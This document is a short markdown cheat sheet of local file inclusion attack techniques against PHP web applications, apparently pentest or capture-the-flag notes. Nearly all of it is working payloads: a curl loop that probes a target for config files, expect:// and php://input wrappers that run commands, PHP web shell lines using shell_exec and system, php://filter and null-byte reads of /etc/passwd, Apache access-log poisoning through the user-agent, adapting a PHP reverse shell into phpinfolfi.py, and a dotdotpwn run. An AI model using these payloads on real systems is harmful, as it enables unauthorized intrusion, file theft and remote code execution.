# LFI

## Check paths.txt for common acessible config files

```bash
while IFS="" read -r p || [ -n "$p" ]
do
  printf '%s\n' "$p"
  curl 'http://dev.team.thm/script.php?page='"$p"
done < paths.txt
```

## PHP Wrappers

### PHP Expect Wrapper

```
php?page=expect://ls
```

### PHP Wrapper php://file

```
example1.php?page=php://input&cmd=ls
```

Then send post request with the following in the body

```
<?php echo shell_exec($_GET['cmd']);?>
```

### PHP php://filter


```
vuln.php?page=php://filter/convert.base64-encode/resource=/etc/passwd

?page=php://filter/resource=/etc/passwd
```

### Apache Log Poisoning through LFI

Check to see if you can access the access.log file

```
192.168.1.129/lfi/lfi.php?file=/var/log/apache2/access.log
```

Change the user-agent to this:
```
<?php system($_GET['cmd']); ?>
```
Apache will execute the command and output the response into the access.log

```
192.168.1.129/lfi/lfi.php?file=/var/log/apache2/access.log&cmd=whoami
```

### Null Byte

```
http://ex.com/index.php?page=../../../etc/passwd%00
```

### phpinfo LFI

Find the script on the PayloadALlTheThings/File Inclusion-Path Traversal git repository (phpinfolfi.py)

Modify the payload from the script with the payload from php-reverse-shell.php

```
locate php-reverse
/usr/share/laudanum/php/php-reverse-shell.php
```

Edit the IP address and the port

Check the LFIREQ variable.

Run script and listen for connection

### dotdotpwn automation tool

```
dotdotpwn -m http -h IP -o windows
```